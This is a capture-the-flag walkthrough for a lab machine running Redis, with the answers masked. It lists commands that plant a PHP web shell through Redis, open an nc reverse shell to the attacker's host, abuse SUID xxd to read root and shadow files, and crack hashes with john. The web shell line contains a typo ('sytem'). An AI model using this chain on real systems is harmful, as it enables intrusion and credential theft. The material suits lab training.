# Res

- Scan the machine, how many ports are open?

	- `scilla port -target <TARGET_IP>`
	- `*`

- What's is the database management system installed on the server?

	- `Redis`

- What port is the database management system running on?

	- `****`

- What's is the version of management system installed on the server?

	- `nc -v <TARGET_IP> <PORT>`
	- `info`
	- `*.*.*`

- Compromise the machine and locate user.txt

	- `nc -v <TARGET_IP> <PORT>`
	- `config set dir /var/www/html/`
	- `config set dbfilename info.php`
	- `set test "<?php phpinfo(); ?>"`
	- `save`
	- Navigate to `http://<TARGET_IP>/info.php`
	- On your machine `nc -lnvp 4444`
	- On target `config set dir /var/www/html/`
	- `config set dbfilename shell.php`
	- `set test "<?php sytem($_GET['cmd']); ?>"`
	- `save`
	- Navigate to `http://<TARGET_IP>/shell.php?cmd=nc%20<YOUR_IP>%20<PORT>%20-e%20/bin/sh`
	- `id`
	- `cd /home/vianka`
	- `cat user.txt`
	- `*******************************`

- Escalate privileges and obtain root.txt

	- Using [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)
	- `xxd` with SUID bit set.
	- Go on GTFObins and search for SUID xxd.
	- `sudo sh -c 'cp $(which xxd) .; chmod +s ./xxd'`
	- `LFILE=/root/root.txt`
	- `./xxd "$LFILE" | xxd -r`
	- `/usr/bin/xxd "$LFILE" | xxd -r`
	- `********************`

- what is the local user account password?

	- Use the above `xxd` abuse against `/etc/shadow`
	- Then copy only the vianka line of shadow and passwd and paste them inside two files.
	- `unshadow passwd shadow > passwords.txt`
	- `john passwords.txt`
	- `**********`
